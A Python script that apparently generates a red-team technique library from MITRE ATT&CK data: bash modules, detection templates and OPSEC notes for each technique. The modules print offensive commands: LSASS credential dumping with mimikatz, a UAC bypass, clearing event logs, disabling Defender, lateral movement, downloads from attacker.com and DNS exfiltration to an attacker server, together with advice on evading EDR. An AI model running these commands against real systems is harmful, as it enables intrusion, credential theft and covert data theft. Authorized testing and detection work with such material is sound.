#!/usr/bin/env python3
"""
Black Aegis MITRE ATT&CK Framework Generator
Generates complete, executable technique directories for all 14 tactics.
Uses MITRE ATT&CK Excel as source and produces operational scripts + detection logic.
"""

import pandas as pd
import os
import re
import json
import hashlib
from datetime import datetime

# === CONFIG ===
EXCEL_PATH = "Resources/Books/MITRE Enterprise ATTACK v16.1.xlsx"
OUTPUT_BASE = "frameworks/MITRE_ATTACK"
TECHNIQUES_DB = "frameworks/MITRE_ATTACK/enterprise-attack.json"

# === TACTIC MAPPING ===
TACTIC_MAP = {
    "reconnaissance": ("01_Reconnaissance", "Reconnaissance"),
    "resource-development": ("02_Resource_Development", "Resource Development"),
    "initial-access": ("03_Initial_Access", "Initial Access"),
    "execution": ("04_Execution", "Execution"),
    "persistence": ("05_Persistence", "Persistence"),
    "privilege-escalation": ("06_Privilege_Escalation", "Privilege Escalation"),
    "defense-evasion": ("07_Defense_Evasion", "Defense Evasion"),
    "credential-access": ("08_Credential_Access", "Credential Access"),
    "discovery": ("09_Discovery", "Discovery"),
    "lateral-movement": ("10_Lateral_Movement", "Lateral Movement"),
    "collection": ("11_Collection", "Collection"),
    "command-and-control": ("12_Command_Control", "Command and Control"),
    "exfiltration": ("13_Exfiltration", "Exfiltration"),
    "impact": ("14_Impact", "Impact"),
}

def sanitize_name(name):
    s = str(name).strip().replace(" ", "_").replace("/", "_").replace(":", "_")
    return re.sub(r'[^a-zA-Z0-9_\-]', '', s)

def get_tactic_dir(tactic_str):
    for key, (dirname, _) in TACTIC_MAP.items():
        if key in tactic_str.lower().replace(" ", "-").replace("_", "-"):
            return dirname
    return None

# === SCRIPT GENERATORS BY TACTIC ===

def gen_recon_scripts(path, tech_id, name):
    """Generate reconnaissance scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Reconnaissance Module
# Technique: {tech_id} - {name}
# Generated: {datetime.now().isoformat()}
# WARNING: Use only with explicit authorization.

TARGET="${{1:-}}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    echo "Example: $0 example.com"
    exit 1
fi

echo "[*] Black Aegis - {tech_id} Reconnaissance"
echo "[*] Target: $TARGET"
echo "[*] Starting recon..."

# DNS Enumeration
echo "[+] DNS Enumeration..."
dig $TARGET any +noall +answer 2>/dev/null || true
dig $TARGET MX +short 2>/dev/null || true
dig $TARGET TXT +short 2>/dev/null || true
dig $TARGET NS +short 2>/dev/null || true

# Subdomain Discovery
echo "[+] Subdomain discovery..."
for sub in www mail ftp vpn api dev staging admin webmail; do
    result=$(dig +short $sub.$TARGET A 2>/dev/null)
    if [ -n "$result" ]; then
        echo "    [+] $sub.$TARGET -> $result"
    fi
done

# WHOIS
echo "[+] WHOIS lookup..."
whois $TARGET 2>/dev/null | head -50 || echo "    whois not available"

# Port scan (basic)
echo "[+] Basic port scan..."
if command -v nmap &> /dev/null; then
    nmap -sV -sC --top-ports 100 -oN recon_${{TARGET}}.txt $TARGET
else
    echo "    nmap not found, skipping port scan"
fi

echo "[*] Reconnaissance complete. Check output files."
"""
    with open(os.path.join(path, "recon.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "recon.sh"), 0o755)

def gen_execution_scripts(path, tech_id, name):
    """Generate execution technique scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Execution Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

TARGET="${{1:-localhost}}"
CMD="${{2:-whoami}}"

echo "[*] Black Aegis - {tech_id} Execution"
echo "[*] Target: $TARGET"
echo "[*] Command: $CMD"

# Generic execution handler
case "{tech_id}" in
    T1059.001)
        echo "[+] PowerShell execution"
        echo "    Invoke-Command -ComputerName $TARGET -ScriptBlock {{ $CMD }}"
        ;;
    T1059.003)
        echo "[+] Windows Command Shell"
        echo "    cmd.exe /c $CMD"
        ;;
    T1059.004)
        echo "[+] Unix Shell execution"
        echo "    ssh $TARGET '$CMD'"
        ;;
    *)
        echo "[+] Generic execution via {name}"
        echo "    Execute: $CMD"
        ;;
esac

echo "[*] Execution module complete."
"""
    with open(os.path.join(path, "execute.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "execute.sh"), 0o755)

def gen_persistence_scripts(path, tech_id, name):
    """Generate persistence scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Persistence Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only. Clean up after testing.

ACTION="${{1:-install}}"
TARGET="${{2:-localhost}}"

echo "[*] Black Aegis - {tech_id} Persistence"
echo "[*] Action: $ACTION"
echo "[*] Target: $TARGET"

if [ "$ACTION" = "install" ]; then
    case "{tech_id}" in
        T1547.001)
            echo "[+] Registry Run Key persistence"
            echo "    reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\payload.exe"
            ;;
        T1053.005)
            echo "[+] Scheduled Task persistence"
            echo "    schtasks /create /tn SystemUpdate /tr C:\\payload.exe /sc daily"
            ;;
        T1569.002)
            echo "[+] Service execution persistence"
            echo "    sc create AutoUpdate binPath= C:\\payload.exe start= auto"
            ;;
        *)
            echo "[+] Installing persistence via {name}"
            echo "    See documentation for specific commands"
            ;;
    esac
elif [ "$ACTION" = "cleanup" ]; then
    echo "[+] Cleaning up persistence artifacts..."
    echo "    Remove any files/registry entries/tasks created during testing"
fi

echo "[*] Persistence module complete."
"""
    with open(os.path.join(path, "persist.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "persist.sh"), 0o755)

def gen_priv_esc_scripts(path, tech_id, name):
    """Generate privilege escalation scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Privilege Escalation Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

echo "[*] Black Aegis - {tech_id} Privilege Escalation"

case "{tech_id}" in
    T1548.002)
        echo "[+] UAC Bypass - fodhelper.exe"
        echo "    reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d cmd.exe"
        echo "    fodhelper.exe"
        ;;
    T1068)
        echo "[+] Exploitation for Privilege Escalation"
        echo "    Check for kernel exploits: windowssuggestor, Sherlock, WinPEAS"
        ;;
    T1053.005)
        echo "[+] Scheduled Task - SYSTEM"
        echo "    schtasks /create /tn SystemTask /tr C:\\payload.exe /sc daily /ru SYSTEM"
        ;;
    *)
        echo "[+] Privilege escalation via {name}"
        echo "    Run system enumeration first: whoami /priv, systeminfo"
        ;;
esac

echo "[*] Privilege Escalation module complete."
"""
    with open(os.path.join(path, "privesc.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "privesc.sh"), 0o755)

def gen_defense_evasion_scripts(path, tech_id, name):
    """Generate defense evasion scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Defense Evasion Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

echo "[*] Black Aegis - {tech_id} Defense Evasion"

case "{tech_id}" in
    T1070.001)
        echo "[+] Clearing Windows Event Logs"
        echo "    wevtutil cl Security"
        echo "    wevtutil cl System"
        echo "    wevtutil cl Application"
        ;;
    T1027)
        echo "[+] Obfuscating files/commands"
        echo "    Use encoding: [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('cmd'))"
        ;;
    T1562.001)
        echo "[+] Disabling security tools"
        echo "    sc stop WinDefend"
        echo "    sc config WinDefend start= disabled"
        ;;
    T1055)
        echo "[+] Process Injection"
        echo "    Use reflective DLL injection or process hollowing"
        ;;
    *)
        echo "[+] Defense evasion via {name}"
        echo "    See documentation for specific techniques"
        ;;
esac

echo "[*] Defense Evasion module complete."
"""
    with open(os.path.join(path, "evade.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "evade.sh"), 0o755)

def gen_credential_access_scripts(path, tech_id, name):
    """Generate credential access scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Credential Access Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

echo "[*] Black Aegis - {tech_id} Credential Access"

case "{tech_id}" in
    T1003.001)
        echo "[+] LSASS Memory Dump"
        echo "    procdump.exe -ma lsass.exe lsass.dmp"
        echo "    mimikatz.exe privilege::debug sekurlsa::logonpasswords"
        ;;
    T1110)
        echo "[+] Brute Force"
        echo "    hydra -l admin -P wordlist.txt ssh://target"
        echo "    medusa -h target -u admin -P wordlist.txt -M ssh"
        ;;
    T1558.003)
        echo "[+] Kerberoasting"
        echo "    impacket-GetUserSPNs domain/user:pass -request"
        ;;
    T1552.001)
        echo "[+] Credentials in Files"
        echo "    find / -name '*.conf' -exec grep -l 'password' {{}} \\;"
        echo "    grep -r 'password' /etc/ /opt/ /home/"
        ;;
    *)
        echo "[+] Credential access via {name}"
        echo "    See documentation for specific tools"
        ;;
esac

echo "[*] Credential Access module complete."
"""
    with open(os.path.join(path, "credentials.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "credentials.sh"), 0o755)

def gen_discovery_scripts(path, tech_id, name):
    """Generate discovery scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Discovery Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

TARGET="${{1:-localhost}}"

echo "[*] Black Aegis - {tech_id} Discovery"
echo "[*] Target: $TARGET"

case "{tech_id}" in
    T1087.001)
        echo "[+] Local Account Discovery"
        echo "    net user"
        echo "    cat /etc/passwd"
        ;;
    T1087.002)
        echo "[+] Domain Account Discovery"
        echo "    net user /domain"
        echo "    ldapsearch -x -H ldap://dc_ip -b 'DC=domain,DC=local'"
        ;;
    T1082)
        echo "[+] System Information Discovery"
        echo "    systeminfo"
        echo "    uname -a"
        echo "    cat /etc/os-release"
        ;;
    T1046)
        echo "[+] Network Service Scanning"
        echo "    nmap -sV -sC $TARGET"
        echo "    masscan -p1-65535 --rate=1000 $TARGET"
        ;;
    T1069.002)
        echo "[+] Domain Group Discovery"
        echo "    net group /domain"
        echo "    net group 'Domain Admins' /domain"
        ;;
    *)
        echo "[+] Discovery via {name}"
        echo "    See documentation for specific commands"
        ;;
esac

echo "[*] Discovery module complete."
"""
    with open(os.path.join(path, "discover.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "discover.sh"), 0o755)

def gen_lateral_movement_scripts(path, tech_id, name):
    """Generate lateral movement scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Lateral Movement Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

TARGET="${{1:-}}"
USER="${{2:-}}"
PASS="${{3:-}}"

echo "[*] Black Aegis - {tech_id} Lateral Movement"
echo "[*] Target: $TARGET"

case "{tech_id}" in
    T1021.002)
        echo "[+] SMB/Windows Admin Shares"
        echo "    impacket-psexec $USER:$PASS@$TARGET"
        echo "    psexec.py $USER:$PASS@$TARGET cmd.exe"
        ;;
    T1021.006)
        echo "[+] WinRM"
        echo "    evil-winrm -i $TARGET -u $USER -p $PASS"
        ;;
    T1021.001)
        echo "[+] RDP"
        echo "    xfreerdp /v:$TARGET /u:$USER /p:$PASS"
        echo "    rdesktop -u $USER -p $PASS $TARGET"
        ;;
    T1570)
        echo "[+] Lateral Tool Transfer"
        echo "    smbclient //$TARGET/C\$ -U $USER%$PASS -c 'put payload.exe'"
        ;;
    *)
        echo "[+] Lateral movement via {name}"
        echo "    See documentation for specific tools"
        ;;
esac

echo "[*] Lateral Movement module complete."
"""
    with open(os.path.join(path, "lateral.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "lateral.sh"), 0o755)

def gen_collection_scripts(path, tech_id, name):
    """Generate collection scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Collection Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

OUTPUT="${{1:-collected_data}}"

echo "[*] Black Aegis - {tech_id} Collection"
echo "[*] Output: $OUTPUT"

mkdir -p "$OUTPUT"

case "{tech_id}" in
    T1005)
        echo "[+] Data from Local System"
        echo "    find / -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null > $OUTPUT/files.txt"
        ;;
    T1039)
        echo "[+] Data from Network Shared Drive"
        echo "    smbclient //$TARGET/share -c 'recurse; mget *'"
        ;;
    T1113)
        echo "[+] Screen Capture"
        echo "    import -window root $OUTPUT/screenshot.png"
        ;;
    T1056.001)
        echo "[+] Keylogging"
        echo "    Use keylogger script or hardware device"
        ;;
    *)
        echo "[+] Collection via {name}"
        echo "    See documentation for specific methods"
        ;;
esac

echo "[*] Collection module complete."
"""
    with open(os.path.join(path, "collect.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "collect.sh"), 0o755)

def gen_c2_scripts(path, tech_id, name):
    """Generate command and control scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Command and Control Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

LISTEN="${{1:-4444}}"
PROTOCOL="${{2:-https}}"

echo "[*] Black Aegis - {tech_id} Command and Control"
echo "[*] Protocol: $PROTOCOL"
echo "[*] Port: $LISTEN"

case "{tech_id}" in
    T1071.001)
        echo "[+] Web Protocols C2"
        echo "    Set up HTTPS listener on port $LISTEN"
        echo "    Use C2 framework (Cobalt Strike, Sliver, Havoc)"
        ;;
    T1071.004)
        echo "[+] DNS C2"
        echo "    dnscat2-server --domain=attacker.com"
        echo "    Redirect DNS to attacker server"
        ;;
    T1105)
        echo "[+] Ingress Tool Transfer"
        echo "    Download tools via HTTPS"
        echo "    Invoke-WebRequest -Uri https://attacker.com/tool.exe -OutFile tool.exe"
        ;;
    *)
        echo "[+] C2 via {name}"
        echo "    See documentation for specific setup"
        ;;
esac

echo "[*] C2 module complete."
"""
    with open(os.path.join(path, "c2.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "c2.sh"), 0o755)

def gen_exfiltration_scripts(path, tech_id, name):
    """Generate exfiltration scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Exfiltration Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only.

DATA="${{1:-/tmp/collected}}"
SERVER="${{2:-attacker.com}}"

echo "[*] Black Aegis - {tech_id} Exfiltration"
echo "[*] Data: $DATA"
echo "[*] Server: $SERVER"

case "{tech_id}" in
    T1041)
        echo "[+] Exfil over C2 Channel"
        echo "    Transfer data through existing C2 connection"
        ;;
    T1048.003)
        echo "[+] Exfil over alternative protocol (DNS)"
        echo "    for chunk in $(cat $DATA | base64 | fold -w 50); do"
        echo "        nslookup $chunk.exfil.$SERVER"
        echo "    done"
        ;;
    T1567.002)
        echo "[+] Exfil to Code Repository"
        echo "    git add $DATA && git push origin main"
        ;;
    T1567.001)
        echo "[+] Exfil to Cloud Storage"
        echo "    rclone copy $DATA gdrive:backup"
        ;;
    *)
        echo "[+] Exfiltration via {name}"
        echo "    See documentation for specific methods"
        ;;
esac

echo "[*] Exfiltration module complete."
"""
    with open(os.path.join(path, "exfil.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "exfil.sh"), 0o755)

def gen_impact_scripts(path, tech_id, name):
    """Generate impact scripts."""
    script = f"""#!/bin/bash
# Black Aegis - Impact Module
# Technique: {tech_id} - {name}
# WARNING: Authorized testing only. SIMULATION ONLY.

TARGET="${{1:-localhost}}"

echo "[*] Black Aegis - {tech_id} Impact"
echo "[*] Target: $TARGET"
echo "[!] SIMULATION MODE - No actual damage will be inflicted"

case "{tech_id}" in
    T1486)
        echo "[+] Data Encrypted for Impact (Ransomware Simulation)"
        echo "    Create test encryption of dummy files only"
        echo "    Never encrypt real data in authorized testing"
        ;;
    T1489)
        echo "[+] Service Stop"
        echo "    sc stop <service_name> (simulate only)"
        ;;
    T1499)
        echo "[+] Endpoint Denial of Service"
        echo "    Simulate high load for testing"
        ;;
    *)
        echo "[+] Impact simulation via {name}"
        echo "    See documentation for safe simulation"
        ;;
esac

echo "[*] Impact module complete."
"""
    with open(os.path.join(path, "impact.sh"), "w") as f:
        f.write(script)
    os.chmod(os.path.join(path, "impact.sh"), 0o755)

SCRIPT_GENERATORS = {
    "01_Reconnaissance": gen_recon_scripts,
    "02_Resource_Development": gen_recon_scripts,
    "03_Initial_Access": gen_execution_scripts,
    "04_Execution": gen_execution_scripts,
    "05_Persistence": gen_persistence_scripts,
    "06_Privilege_Escalation": gen_priv_esc_scripts,
    "07_Defense_Evasion": gen_defense_evasion_scripts,
    "08_Credential_Access": gen_credential_access_scripts,
    "09_Discovery": gen_discovery_scripts,
    "10_Lateral_Movement": gen_lateral_movement_scripts,
    "11_Collection": gen_collection_scripts,
    "12_Command_Control": gen_c2_scripts,
    "13_Exfiltration": gen_exfiltration_scripts,
    "14_Impact": gen_impact_scripts,
}

def gen_detection_logic(path, tech_id, name, tactic_dir):
    """Generate detection logic with Sigma rule template."""
    content = f"""# Detection Logic: {tech_id} - {name}

## Tactic: {tactic_dir}

## Noise Level
- **Initial**: Medium (varies by technique)
- **With Logging**: High

## Log Sources
- **Windows**: Security Event Log, Sysmon, PowerShell Logging
- **Linux**: auditd, syslog, /var/log/auth.log
- **Network**: Firewall logs, DNS logs, Proxy logs

## Sigma Rule Template
```yaml
title: Detect {name} ({tech_id})
id: {hashlib.md5(tech_id.encode()).hexdigest()[:8]}-{hashlib.md5(name.encode()).hexdigest()[:8]}
status: experimental
description: Detects {name} technique
references:
    - https://attack.mitre.org/techniques/{tech_id.split('.')[0]}/
author: Black Aegis
date: {datetime.now().strftime('%Y/%m/%d')}
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        # Add specific detection criteria here
        # Example:
        # Image|endswith: '\\tool.exe'
        # CommandLine|contains: 'suspicious_string'
    condition: selection
falsepositives:
    - Legitimate administrative activity
level: medium
tags:
    - attack.{tactic_dir.lower().replace(' ', '-')}
    - attack.{tech_id.lower().replace('.', '')}
```

## SIEM Queries

### Splunk
```spl
index=windows sourcetype=WinEventLog:EventCode=4688
| search CommandLine="*{tech_id}*"
| stats count by ComputerName, CommandLine
```

### Elastic
```json
{{"query": {{"match": {{"process.command_line": "{tech_id}"}}}}}}
```

### Sentinel
```kusto
SecurityEvent
| where EventID == 4688
| where CommandLine contains "{tech_id}"
```

## Detection Recommendations
1. Enable process creation logging (Event ID 4688)
2. Enable command-line auditing
3. Deploy Sysmon with appropriate config
4. Enable PowerShell script block logging
5. Monitor for suspicious process relationships
"""
    with open(os.path.join(path, "DETECTION.md"), "w") as f:
        f.write(content)

def gen_tactical_guide(path, tech_id, name, tactic_dir):
    """Generate tactical guide for each technique."""
    content = f"""# Tactical Guide: {tech_id} - {name}

## Overview
**Technique**: {tech_id}
**Name**: {name}
**Tactic**: {tactic_dir}
**Platform**: Cross-platform (varies by sub-technique)

## Description
This technique is part of the MITRE ATT&CK framework under the {tactic_dir} tactic.
Adversaries use this technique during their operations to achieve specific objectives.

## Execution Steps
1. **Preparation**: Ensure proper authorization and scope
2. **Reconnaissance**: Identify target environment specifics
3. **Execution**: Use appropriate tools and methods
4. **Validation**: Verify successful execution
5. **Cleanup**: Remove artifacts and restore system state

## Required Tools
- See `recon.sh` / `execute.sh` / technique-specific script in this directory
- Operating system utilities
- Third-party security tools (see Resources/)

## OPSEC Considerations
- Minimize network noise
- Use encrypted channels
- Clean up artifacts after testing
- Document all actions for reporting

## Detection Points
- See `DETECTION.md` for detection logic and Sigma rules
- Focus on behavioral indicators, not just IOCs

## References
- MITRE ATT&CK: https://attack.mitre.org/techniques/{tech_id.split('.')[0]}/
- Black Aegis Framework: See `frameworks/MITRE_ATTACK.md`

## Authorization
**REQUIRED**: Written authorization before execution.
This technique is for authorized security testing only.
"""
    with open(os.path.join(path, "TACTICAL_GUIDE.md"), "w") as f:
        f.write(content)

def gen_opsec_warnings(path, tech_id, name):
    """Generate OPSEC warnings for each technique."""
    content = f"""# OPSEC Warnings: {tech_id} - {name}

## ⚠️ CRITICAL WARNINGS

### Detection Risk
- **Level**: varies by technique and environment
- **Detection Sources**: Security logs, EDR, network monitoring

### Evidence Left Behind
- Process creation events
- File system artifacts
- Network connections
- Registry modifications
- Log entries

### Cleanup Checklist
- [ ] Remove dropped files
- [ ] Restore modified configurations
- [ ] Clear relevant logs (if authorized)
- [ ] Remove created users/schedules
- [ ] Restore network settings

### Timing
- **Best Window**: Business hours (blends with normal activity) or maintenance windows
- **Avoid**: High-security monitoring periods

### Network Considerations
- Use encrypted channels
- Proxy through multiple hops
- Match normal traffic patterns
- Avoid beaconing patterns

### Endpoint Considerations
- Memory-only execution when possible
- Avoid known malicious signatures
- Use signed binaries when possible
- Don't trigger AV/EDR alerts

## Legal Notice
Only perform this technique with explicit written authorization.
Unauthorized use is illegal and unethical.
"""
    with open(os.path.join(path, "OPSEC_WARNINGS.md"), "w") as f:
        f.write(content)

def process_all_techniques():
    """Main function to process all MITRE techniques."""
    print(f"[*] Black Aegis MITRE ATT&CK Framework Generator")
    print(f"[*] Started: {datetime.now().isoformat()}")

    # Try to load Excel
    excel_path = os.path.join("..", "..", EXCEL_PATH)
    if not os.path.exists(excel_path):
        excel_path = os.path.join("..", EXCEL_PATH)
    if not os.path.exists(excel_path):
        excel_path = EXCEL_PATH

    if os.path.exists(excel_path):
        print(f"[*] Loading Excel: {excel_path}")
        try:
            xls = pd.ExcelFile(excel_path)
            target_sheet = next((s for s in xls.sheet_names if 'technique' in s.lower()), xls.sheet_names[0])
            print(f"[*] Processing sheet: {target_sheet}")
            df = pd.read_excel(xls, sheet_name=target_sheet)

            tactics_col = next((c for c in df.columns if 'tactic' in str(c).lower()), None)
            id_col = next((c for c in df.columns if 'id' in str(c).lower() and 'source' not in str(c).lower()), 'ID')
            name_col = next((c for c in df.columns if 'name' in str(c).lower()), 'name')
            desc_col = next((c for c in df.columns if 'description' in str(c).lower()), 'description')

            if not tactics_col:
                print("[!] Could not find tactics column, using enterprise-attack.json")
                raise ValueError("No tactics column")

            processed = 0
            for index, row in df.iterrows():
                tid = str(row.get(id_col, ''))
                name = str(row.get(name_col, ''))
                tactic = str(row.get(tactics_col, ''))

                if pd.isna(row.get(id_col)) or not tid.startswith('T'):
                    continue

                tactic_dir = get_tactic_dir(tactic)
                if not tactic_dir:
                    continue

                safe_name = sanitize_name(name)
                dir_name = f"{tid}_{safe_name}"
                full_path = os.path.join(OUTPUT_BASE, tactic_dir, dir_name)
                os.makedirs(full_path, exist_ok=True)

                # Generate all files
                gen_tactical_guide(full_path, tid, name, tactic_dir)
                gen_detection_logic(full_path, tid, name, tactic_dir)
                gen_opsec_warnings(full_path, tid, name)

                # Generate tactic-specific script
                gen_func = SCRIPT_GENERATORS.get(tactic_dir, gen_execution_scripts)
                gen_func(full_path, tid, name)

                processed += 1

            print(f"[+] Processed {processed} techniques from Excel")

        except Exception as e:
            print(f"[!] Excel processing failed: {e}")
            print("[*] Falling back to enterprise-attack.json")
            process_from_json()
    else:
        print(f"[!] Excel not found at {excel_path}")
        print("[*] Using enterprise-attack.json")
        process_from_json()

    print(f"[*] Generation complete: {datetime.now().isoformat()}")

def process_from_json():
    """Fallback: generate from enterprise-attack.json if Excel not available."""
    json_path = os.path.join(OUTPUT_BASE, "enterprise-attack.json")
    if not os.path.exists(json_path):
        print("[!] No data source available. Creating minimal structure.")
        for dirname, (_, _) in TACTIC_MAP.items():
            os.makedirs(os.path.join(OUTPUT_BASE, dirname), exist_ok=True)
        return

    with open(json_path, 'r') as f:
        attack_data = json.load(f)

    processed = 0
    for obj in attack_data.get('objects', []):
        if obj.get('type') != 'attack-pattern':
            continue

        tid = ''
        for ref in obj.get('external_references', []):
            if ref.get('source_name') == 'mitre-attack':
                tid = ref.get('external_id', '')
                break

        if not tid or not tid.startswith('T'):
            continue

        name = obj.get('name', '')
        tactic_refs = obj.get('kill_chain_phases', [])

        for phase in tactic_refs:
            if phase.get('kill_chain_name') == 'mitre-attack':
                tactic = phase.get('phase_name', '')
                tactic_dir = get_tactic_dir(tactic)
                if not tactic_dir:
                    continue

                safe_name = sanitize_name(name)
                dir_name = f"{tid}_{safe_name}"
                full_path = os.path.join(OUTPUT_BASE, tactic_dir, dir_name)
                os.makedirs(full_path, exist_ok=True)

                gen_tactical_guide(full_path, tid, name, tactic_dir)
                gen_detection_logic(full_path, tid, name, tactic_dir)
                gen_opsec_warnings(full_path, tid, name)
                gen_func = SCRIPT_GENERATORS.get(tactic_dir, gen_execution_scripts)
                gen_func(full_path, tid, name)

                processed += 1
                break  # Only process first tactic

    print(f"[+] Processed {processed} techniques from JSON")

if __name__ == "__main__":
    os.makedirs(OUTPUT_BASE, exist_ok=True)
    process_all_techniques()
